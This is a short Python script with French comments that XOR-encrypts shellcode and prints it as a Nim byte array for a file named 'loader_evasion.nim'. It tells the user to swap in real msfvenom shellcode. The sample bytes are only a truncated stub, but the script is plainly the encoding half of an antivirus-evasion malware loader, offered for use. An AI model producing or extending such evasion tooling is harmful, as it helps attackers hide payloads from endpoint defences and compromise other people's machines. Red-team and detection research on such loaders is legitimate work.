
#!/usr/bin/env python3
"""
Générateur de shellcode XOR pour Nim
"""

# Clé XOR (doit correspondre à celle dans loader_evasion.nim)
XOR_KEY = [0xAA, 0xBB, 0xCC, 0xDD]

# Shellcode original (remplace par ton vrai shellcode msfvenom)
original_shellcode = [
    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00
]

# Fonction XOR
def xor_encrypt(data, key):
    encrypted = []
    for i, byte in enumerate(data):
        encrypted.append(byte ^ key[i % len(key)])
    return encrypted

# Chiffrer
encrypted = xor_encrypt(original_shellcode, XOR_KEY)

# Afficher au format Nim
print("var encryptedShellcode: array[{}, byte] = [".format(len(encrypted)))
hex_bytes = ", ".join([f"byte 0x{b:02X}" for b in encrypted])
print(f"  {hex_bytes}")
print("]")

print("\n[+] Copie ce code dans loader_evasion.nim")